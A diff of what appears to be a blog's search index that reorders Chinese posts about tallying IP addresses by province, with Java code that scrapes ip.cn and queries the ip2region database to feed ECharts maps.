@@ -184,23 +184,6 @@
       </tags>
   </entry>
   <entry>
-    <title>IP地址分布分析(国内)</title>
-    <url>/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/</url>
-    <content><![CDATA[<h2 id="IP地址分布分析-国内"><a href="#IP地址分布分析-国内" class="headerlink" title="IP地址分布分析(国内)"></a>IP地址分布分析(国内)</h2><p><em>因为工作的原因，简单整理了一下，效率极低，娱乐用</em></p>
-<h3 id="ip所在地来源"><a href="#ip所在地来源" class="headerlink" title="ip所在地来源"></a>ip所在地来源</h3><p>因为第一次做这个，没弄数据库和根据ip段来判断，直接请求<a href="https://ip.cn/" target="_blank" rel="noopener">ip.cn</a>，通过jsoup来获取页面数据。发现GeoIP数据不是很准确，基本以页面<code>所在地理位置</code>的数据为准，在获取不到准确数据的情况下参考页面<code>GeoIP</code>数据。<br>请求是最影响效率的地方，基本每秒请求一次，偶尔会报错（超时，520之类），毕竟是免费的。实际上分析的时候用的多线程（500条为一组），把没获取全的数据单独执行获取，然后在Excel表格里手动修改错误数据，然后整理计算。<br><img src="/img/20200402/1.png" alt></p>
-<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>后来（工作完成后）根据获取数据的规律，简单写了下（渣）代码，基本就是读取ip，获取ip所在省份，ip所在省份加一。执行错误，或者有无法识别的IP（国外，本地，特殊IP等）需要手动判断。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.SocketException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang3.StringUtils;</span><br><span class="line">import org.jsoup.Connection;</span><br><span class="line">import org.jsoup.Jsoup;</span><br><span class="line">import org.jsoup.nodes.Document;</span><br><span class="line">import org.jsoup.select.Elements;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreater &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line">	</span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\ips.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		Map&lt;String, Integer&gt; provinceMap = new LinkedHashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceMap.put(&quot;北京&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;天津&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;上海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;重庆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;云南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;辽宁&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;安徽&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;新疆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江苏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;浙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;甘肃&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙古&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;陕西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;吉林&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;福建&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;贵州&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;青海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;西藏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;四川&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;宁夏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;海南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;台湾&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;香港&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;澳门&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;其他&quot;, 0);</span><br><span class="line"></span><br><span class="line">		Map&lt;String, Integer&gt; provinceGeoIpMap = new HashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceGeoIpMap.put(&quot;Beijing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tianjin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Chongqing&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hebei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Yunnan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Liaoning&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Heilongjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hunan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Anhui&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shandong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Xinjiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangsu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Zhejiang&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jiangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hubei&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangxi&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Gansu&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shanxi&quot;, 0); // 山西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Inner Mongolia Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Shaanxi&quot;, 0); // 陕西</span><br><span class="line">		provinceGeoIpMap.put(&quot;Jilin&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Fujian&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guizhou&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Guangdong&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Qinghai&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Tibet&quot;, 0); // 西藏</span><br><span class="line">		provinceGeoIpMap.put(&quot;Sichuan&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Ningxia Hui Autonomous Region&quot;, 0);</span><br><span class="line">		provinceGeoIpMap.put(&quot;Hainan&quot;, 0);</span><br><span class="line"></span><br><span class="line">		StringBuffer other = new StringBuffer();</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				// 获取ip.cn的页面内容</span><br><span class="line">				Document html = httpGet(&quot;https://ip.cn/?ip=&quot; + ips[i], null);</span><br><span class="line">				Elements pelements = html.getElementsByClass(&quot;well&quot;).get(0).getElementsByTag(&quot;p&quot;);</span><br><span class="line">				// 所在地理位置</span><br><span class="line">				String addresStr = pelements.get(1).getElementsByTag(&quot;code&quot;).text();</span><br><span class="line">				String provinceAddresStr = addresStr.substring(0, 2);</span><br><span class="line">				// GeoIP(局域网以及特殊ip没有)</span><br><span class="line">				String geoIpStr = pelements.size() == 3 ? pelements.get(2).getElementsByTag(&quot;code&quot;).text() : &quot;&quot;;</span><br><span class="line">				String[] geoIpAry = geoIpStr.split(&quot;, &quot;);</span><br><span class="line">				String provinceGeoIpStr = 1 &lt; geoIpAry.length ? geoIpAry[geoIpAry.length - 2]</span><br><span class="line">						: 0 &lt; geoIpAry.length ? geoIpAry[0] : &quot;&quot;;</span><br><span class="line"></span><br><span class="line">				System.out.println(i + &quot;\t&quot; + provinceAddresStr + &quot;\t&quot; + provinceGeoIpStr);</span><br><span class="line">				// 根据所在地理位置判断</span><br><span class="line">				if (provinceMap.get(provinceAddresStr) == null) &#123;</span><br><span class="line">					// 根据GeoIP判断</span><br><span class="line">					if (provinceGeoIpMap.get(provinceGeoIpStr) == null) &#123;</span><br><span class="line">						// 其他</span><br><span class="line">						provinceMap.put(&quot;其他&quot;, provinceMap.get(&quot;其他&quot;) + 1);</span><br><span class="line">						other.append(i + &quot;\t&quot; + ips[i] + &quot;\t&quot; + addresStr + &quot;\t&quot; + geoIpStr + &quot;\r\n&quot;);</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						provinceGeoIpMap.put(provinceGeoIpStr, provinceGeoIpMap.get(provinceGeoIpStr) + 1);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					provinceMap.put(provinceAddresStr, provinceMap.get(provinceAddresStr) + 1);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; catch (SocketException se) &#123;</span><br><span class="line">			System.out.println(&quot;连接超时，请从最后的下标继续执行，然后手动合并数据。&quot;);</span><br><span class="line">			se.printStackTrace();</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; finally &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				margeCount(provinceMap, provinceGeoIpMap);</span><br><span class="line">				StringBuffer result = new StringBuffer();</span><br><span class="line">				provinceMap.forEach((k, v) -&gt; &#123;</span><br><span class="line">					result.append(&quot;&#123;name: &apos;&quot;).append(k).append(&quot;&apos;,value: &quot;).append(v).append(&quot;&#125;,&quot;);</span><br><span class="line">				&#125;);</span><br><span class="line">				System.out.println(result.toString());</span><br><span class="line">				System.out.println(other);</span><br><span class="line">				// 保存其他数据</span><br><span class="line">				FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\otherIP.txt&quot;));</span><br><span class="line">				fos.write(other.toString().getBytes());</span><br><span class="line">				fos.close();</span><br><span class="line">			&#125; catch (Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * httGet请求</span><br><span class="line">	 */</span><br><span class="line">	private static Document httpGet(String url, String cookie) throws IOException &#123;</span><br><span class="line">		Connection con = Jsoup.connect(url);</span><br><span class="line">		// 请求头设置</span><br><span class="line">		con.header(&quot;Accept&quot;, &quot;*/*&quot;);</span><br><span class="line">		con.header(&quot;User-Agent&quot;,</span><br><span class="line">				&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;);</span><br><span class="line">		if (StringUtils.isNotEmpty(cookie)) &#123;</span><br><span class="line">			// cookie设置</span><br><span class="line">			con.header(&quot;Cookie&quot;, cookie);</span><br><span class="line">		&#125;</span><br><span class="line">		return con.get();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * 数据合并</span><br><span class="line">	 */</span><br><span class="line">	private static void margeCount(Map&lt;String, Integer&gt; targetMap, Map&lt;String, Integer&gt; addMap) &#123;</span><br><span class="line">		targetMap.put(&quot;北京&quot;, targetMap.get(&quot;北京&quot;) + addMap.get(&quot;Beijing&quot;));</span><br><span class="line">		targetMap.put(&quot;天津&quot;, targetMap.get(&quot;天津&quot;) + addMap.get(&quot;Tianjin&quot;));</span><br><span class="line">		targetMap.put(&quot;上海&quot;, targetMap.get(&quot;上海&quot;) + addMap.get(&quot;Shanghai&quot;));</span><br><span class="line">		targetMap.put(&quot;重庆&quot;, targetMap.get(&quot;重庆&quot;) + addMap.get(&quot;Chongqing&quot;));</span><br><span class="line">		targetMap.put(&quot;河北&quot;, targetMap.get(&quot;河北&quot;) + addMap.get(&quot;Hebei&quot;));</span><br><span class="line">		targetMap.put(&quot;河南&quot;, targetMap.get(&quot;河南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">		targetMap.put(&quot;云南&quot;, targetMap.get(&quot;云南&quot;) + addMap.get(&quot;Yunnan&quot;));</span><br><span class="line">		targetMap.put(&quot;辽宁&quot;, targetMap.get(&quot;辽宁&quot;) + addMap.get(&quot;Liaoning&quot;));</span><br><span class="line">		targetMap.put(&quot;黑龙江&quot;, targetMap.get(&quot;黑龙&quot;) + addMap.get(&quot;Heilongjiang&quot;));</span><br><span class="line">		targetMap.remove(&quot;黑龙&quot;);</span><br><span class="line">		targetMap.put(&quot;湖南&quot;, targetMap.get(&quot;湖南&quot;) + addMap.get(&quot;Hunan&quot;));</span><br><span class="line">		targetMap.put(&quot;安徽&quot;, targetMap.get(&quot;安徽&quot;) + addMap.get(&quot;Anhui&quot;));</span><br><span class="line">		targetMap.put(&quot;山东&quot;, targetMap.get(&quot;山东&quot;) + addMap.get(&quot;Shandong&quot;));</span><br><span class="line">		targetMap.put(&quot;新疆&quot;, targetMap.get(&quot;新疆&quot;) + addMap.get(&quot;Xinjiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江苏&quot;, targetMap.get(&quot;江苏&quot;) + addMap.get(&quot;Jiangsu&quot;));</span><br><span class="line">		targetMap.put(&quot;浙江&quot;, targetMap.get(&quot;浙江&quot;) + addMap.get(&quot;Zhejiang&quot;));</span><br><span class="line">		targetMap.put(&quot;江西&quot;, targetMap.get(&quot;江西&quot;) + addMap.get(&quot;Jiangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;湖北&quot;, targetMap.get(&quot;湖北&quot;) + addMap.get(&quot;Hubei&quot;));</span><br><span class="line">		targetMap.put(&quot;广西&quot;, targetMap.get(&quot;广西&quot;) + addMap.get(&quot;Guangxi&quot;));</span><br><span class="line">		targetMap.put(&quot;甘肃&quot;, targetMap.get(&quot;甘肃&quot;) + addMap.get(&quot;Gansu&quot;));</span><br><span class="line">		targetMap.put(&quot;山西&quot;, targetMap.get(&quot;山西&quot;) + addMap.get(&quot;Shanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;内蒙古&quot;, targetMap.get(&quot;内蒙&quot;) + addMap.get(&quot;Inner Mongolia Autonomous Region&quot;));</span><br><span class="line">		targetMap.remove(&quot;内蒙&quot;);</span><br><span class="line">		targetMap.put(&quot;陕西&quot;, targetMap.get(&quot;陕西&quot;) + addMap.get(&quot;Shaanxi&quot;));</span><br><span class="line">		targetMap.put(&quot;吉林&quot;, targetMap.get(&quot;吉林&quot;) + addMap.get(&quot;Jilin&quot;));</span><br><span class="line">		targetMap.put(&quot;福建&quot;, targetMap.get(&quot;福建&quot;) + addMap.get(&quot;Fujian&quot;));</span><br><span class="line">		targetMap.put(&quot;贵州&quot;, targetMap.get(&quot;贵州&quot;) + addMap.get(&quot;Guizhou&quot;));</span><br><span class="line">		targetMap.put(&quot;广东&quot;, targetMap.get(&quot;广东&quot;) + addMap.get(&quot;Guangdong&quot;));</span><br><span class="line">		targetMap.put(&quot;青海&quot;, targetMap.get(&quot;青海&quot;) + addMap.get(&quot;Qinghai&quot;));</span><br><span class="line">		targetMap.put(&quot;西藏&quot;, targetMap.get(&quot;西藏&quot;) + addMap.get(&quot;Tibet&quot;));</span><br><span class="line">		targetMap.put(&quot;四川&quot;, targetMap.get(&quot;四川&quot;) + addMap.get(&quot;Sichuan&quot;));</span><br><span class="line">		targetMap.put(&quot;宁夏&quot;, targetMap.get(&quot;宁夏&quot;) + addMap.get(&quot;Ningxia Hui Autonomous Region&quot;));</span><br><span class="line">		targetMap.put(&quot;海南&quot;, targetMap.get(&quot;海南&quot;) + addMap.get(&quot;Hainan&quot;));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据生成的文本替换Echart的数据，展示效果如下。<br><img src="/img/20200402/2.png" alt><br><a href="https://xuchunlei.top/ipDistributionMap" target="_blank">IP地址分布地图Echarts代码页面</a></p>
-<p><img src="/img/20200402/3.png" alt><br><a href="https://xuchunlei.top/ipDistributionPie" target="_blank">IP地址分布饼状图Echarts代码页面</a></p>
-]]></content>
-      <tags>
-        <tag>Java</tag>
-        <tag>IP</tag>
-        <tag>Echarts</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>IP地址分布分析(国内)·叄</title>
     <url>/2020/05/13/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90-%E5%9B%BD%E5%86%85-%C2%B7%E5%8F%84/</url>
     <content><![CDATA[<h2 id="IP地址分布分析-国内-·叄"><a href="#IP地址分布分析-国内-·叄" class="headerlink" title="IP地址分布分析(国内)·叄"></a>IP地址分布分析(国内)·叄</h2><p><em>最近碰上IP地址数据量百万级的，原来的两套方案根本不能用，于是乎就有了叄。工作可用→工作用</em></p>
@@ -210,6 +193,23 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.lionsoul.ip2region.DataBlock;</span><br><span class="line">import org.lionsoul.ip2region.DbConfig;</span><br><span class="line">import org.lionsoul.ip2region.DbSearcher;</span><br><span class="line">import org.lionsoul.ip2region.Util;</span><br><span class="line">import org.lionsoul.ip2region.test.TestUtil;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreaterByip2region &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line"></span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\useripdis.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			br.close();</span><br><span class="line">			//System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			long startTime =  System.currentTimeMillis();</span><br><span class="line">			DbConfig config = new DbConfig();</span><br><span class="line">			DbSearcher searcher = new DbSearcher(config, TestUtil.class.getResource(&quot;../data/ip2region.db&quot;).getPath()); // 貌似需要完整路径</span><br><span class="line"></span><br><span class="line">			// btreeSearch binarySearch memorySearch</span><br><span class="line">			Method method = searcher.getClass().getMethod(&quot;memorySearch&quot;, String.class); //内存查询算法</span><br><span class="line"></span><br><span class="line">			FileOutputStream fos = new FileOutputStream(new File(&quot;D:\\ipResult.txt&quot;));</span><br><span class="line"></span><br><span class="line">			DataBlock dataBlock = null;</span><br><span class="line">			for (int i = 0; i &lt; ips.length; i++) &#123;</span><br><span class="line">				if (Util.isIpAddress(ips[i])) &#123;</span><br><span class="line">					dataBlock = (DataBlock) method.invoke(searcher, ips[i]);</span><br><span class="line">					String[] regionAry = dataBlock.getRegion().split(&quot;\\|&quot;);</span><br><span class="line">					String result = ips[i] + &quot;\t&quot; + regionAry[0] + &quot;\t&quot; + regionAry[2] + &quot;\t&quot; + regionAry[3] + &quot;\r\n&quot;;</span><br><span class="line">					//System.out.print(i + &quot;:&quot; + result);</span><br><span class="line">					fos.write(result.getBytes());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			fos.close();</span><br><span class="line">			System.out.println(&quot;Finish&quot;);</span><br><span class="line">			long endTime =  System.currentTimeMillis();</span><br><span class="line">			System.out.println((endTime-startTime)/1000 + &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://xuchunlei.top/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/">IP地址分布分析(国内)</a><br><a href="https://xuchunlei.top/2020/04/17/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90-%E5%9B%BD%E5%86%85-%C2%B7%E7%BB%AD/">IP地址分布分析(国内)·续</a></p>
+]]></content>
+      <tags>
+        <tag>Java</tag>
+        <tag>IP</tag>
+        <tag>Echarts</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IP地址分布分析(国内)</title>
+    <url>/2020/04/02/IP%E5%9C%B0%E5%9D%80%E5%88%86%E5%B8%83%E5%88%86%E6%9E%90(%E5%9B%BD%E5%86%85)/</url>
+    <content><![CDATA[<h2 id="IP地址分布分析-国内"><a href="#IP地址分布分析-国内" class="headerlink" title="IP地址分布分析(国内)"></a>IP地址分布分析(国内)</h2><p><em>因为工作的原因，简单整理了一下，效率极低，娱乐用</em></p>
+<h3 id="ip所在地来源"><a href="#ip所在地来源" class="headerlink" title="ip所在地来源"></a>ip所在地来源</h3><p>因为第一次做这个，没弄数据库和根据ip段来判断，直接请求<a href="https://ip.cn/" target="_blank" rel="noopener">ip.cn</a>，通过jsoup来获取页面数据。发现GeoIP数据不是很准确，基本以页面<code>所在地理位置</code>的数据为准，在获取不到准确数据的情况下参考页面<code>GeoIP</code>数据。<br>请求是最影响效率的地方，基本每秒请求一次，偶尔会报错（超时，520之类），毕竟是免费的。实际上分析的时候用的多线程（500条为一组），把没获取全的数据单独执行获取，然后在Excel表格里手动修改错误数据，然后整理计算。<br><img src="/img/20200402/1.png" alt></p>
+<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>后来（工作完成后）根据获取数据的规律，简单写了下（渣）代码，基本就是读取ip，获取ip所在省份，ip所在省份加一。执行错误，或者有无法识别的IP（国外，本地，特殊IP等）需要手动判断。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.FileReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.SocketException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.lang3.StringUtils;</span><br><span class="line">import org.jsoup.Connection;</span><br><span class="line">import org.jsoup.Jsoup;</span><br><span class="line">import org.jsoup.nodes.Document;</span><br><span class="line">import org.jsoup.select.Elements;</span><br><span class="line"></span><br><span class="line">public class IpDistributionCreater &#123;</span><br><span class="line"></span><br><span class="line">	public static void main(String args[]) &#123;</span><br><span class="line">//		String[] ips = &#123; &quot;116.116.91.150&quot;, // 正常内蒙古</span><br><span class="line">//				&quot;127.0.0.1&quot;, // 本地</span><br><span class="line">//				&quot;172.58.22.176&quot;, // 美国</span><br><span class="line">//				&quot;223.104.212.147&quot;, // geoip上海</span><br><span class="line">//				&quot;223.104.148.122&quot;, // geoip江苏</span><br><span class="line">//				&quot;47.75.7.133&quot; &#125;; // 正常香港</span><br><span class="line">//		ipDistributionCreater(ips);</span><br><span class="line">	</span><br><span class="line">		// 数据量大时从文件读取</span><br><span class="line">		List&lt;String&gt; ipList = new ArrayList&lt;String&gt;();</span><br><span class="line">		try &#123;</span><br><span class="line">			BufferedReader br = new BufferedReader(new FileReader(&quot;D:\\ips.txt&quot;));</span><br><span class="line">			String lineStr = &quot;&quot;;</span><br><span class="line">			while ((lineStr = br.readLine()) != null) &#123;</span><br><span class="line">				ipList.add(lineStr);</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(&quot;读取&quot; + ipList.size() + &quot;条IP&quot;);</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		String[] ips = &#123;&#125;;</span><br><span class="line">		ipDistributionCreater(ipList.toArray(ips));</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public static void ipDistributionCreater(String ips[]) &#123;</span><br><span class="line">		Map&lt;String, Integer&gt; provinceMap = new LinkedHashMap&lt;String, Integer&gt;();</span><br><span class="line">		provinceMap.put(&quot;北京&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;天津&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;上海&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;重庆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;河南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;云南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;辽宁&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;黑龙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖南&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;安徽&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山东&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;新疆&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江苏&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;浙江&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;江西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;湖北&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;广西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;甘肃&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;山西&quot;, 0);</span><br><span class="line">		provinceMap.put(&quot;内蒙&quot;, 0);</span><br><span class="line">		